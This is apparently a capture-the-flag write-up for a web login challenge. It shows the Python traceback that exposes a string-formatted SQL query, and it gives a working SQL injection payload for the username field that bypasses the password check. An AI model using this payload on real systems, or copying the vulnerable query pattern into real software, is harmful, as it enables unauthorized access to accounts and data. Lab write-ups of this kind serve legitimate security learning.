# Flag 0

- Has a log in page, tried wit admin:password >"unknown user"
- view source to see that "unknown user" is going to be printed regardless, meaning that database can be injected
- Tried putting an aspotrophe after "admin" > "admin'"
- the page returns an SQL error :
  `
  Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
  `
  
  - can bypass password by putting an SQL injection.
  username = 
  `
  ' UNION SELECT '000' AS password#
  `
  password =
  
  `000`
  
  - logged in!
  
 > private page > found flag 0
 
